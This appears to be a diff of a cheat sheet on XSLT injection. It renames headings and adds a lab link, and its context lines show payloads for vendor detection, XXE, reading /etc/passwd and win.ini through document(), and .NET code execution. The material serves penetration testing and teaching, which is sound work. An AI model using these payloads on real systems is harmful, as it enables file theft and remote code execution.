@@ -4,29 +4,31 @@
 
 ## Summary
 
-- [Summary](#summary)
 - [Tools](#tools)
-- [Exploit](#exploit)
-    - [Determine the vendor and version](#determine-the-vendor-and-version)
+- [Methodology](#methodology)
+    - [Determine the Vendor And Version](#determine-the-vendor-and-version)
     - [External Entity](#external-entity)
-    - [Read files and SSRF using document](#read-files-and-ssrf-using-document)
-    - [Write files with EXSLT extension](#write-files-with-exslt-extension)
-    - [Remote Code Execution with PHP wrapper](#remote-code-execution-with-php-wrapper)
+    - [Read Files and SSRF Using Document](#read-files-and-ssrf-using-document)
+    - [Write Files with EXSLT Extension](#write-files-with-exslt-extension)
+    - [Remote Code Execution with PHP Wrapper](#remote-code-execution-with-php-wrapper)
     - [Remote Code Execution with Java](#remote-code-execution-with-java)
     - [Remote Code Execution with Native .NET](#remote-code-execution-with-native-net)
+- [Labs](#labs)
 - [References](#references)
 
 ## Tools
 
-## Exploit
+No known tools currently exist to assist with XSLT exploitation.
 
-### Determine the vendor and version
+## Methodology
+
+### Determine the Vendor and Version
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/fruits">
-	<xsl:value-of select="system-property('xsl:vendor')"/>
+ <xsl:value-of select="system-property('xsl:vendor')"/>
   </xsl:template>
 </xsl:stylesheet>
 ```
@@ -44,6 +46,8 @@
 
 ### External Entity
 
+Don't forget to test for XXE when you encounter XSLT files.
+
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
@@ -59,7 +63,7 @@
 </xsl:stylesheet>
 ```
 
-### Read files and SSRF using document
+### Read Files and SSRF Using Document
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -69,7 +73,7 @@
     <xsl:copy-of select="document('/etc/passwd')"/>
     <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
     Fruits:
-	    <!-- Loop for each fruit -->
+     <!-- Loop for each fruit -->
     <xsl:for-each select="fruit">
       <!-- Print name: description -->
       - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
@@ -78,10 +82,9 @@
 </xsl:stylesheet>
 ```
 
+### Write Files with EXSLT Extension
 
-### Write files with EXSLT extension
-
-EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. 
+EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -98,8 +101,7 @@ EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions
 </xsl:stylesheet>
 ```
 
-
-### Remote Code Execution with PHP wrapper
+### Remote Code Execution with PHP Wrapper
 
 Execute the function `readfile`.
 
@@ -231,12 +233,15 @@ return proc.StandardOutput.ReadToEnd();
 
   <xsl:template match="/fruits">
   --- BEGIN COMMAND OUTPUT ---
-	<xsl:value-of select="user:execute()"/>
-  --- END COMMAND OUTPUT ---	
+ <xsl:value-of select="user:execute()"/>
+  --- END COMMAND OUTPUT --- 
   </xsl:template>
 </xsl:stylesheet>
 ```
 
+## Labs
+
+- [Root Me - XSLT - Code execution](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)
 
 ## References
 
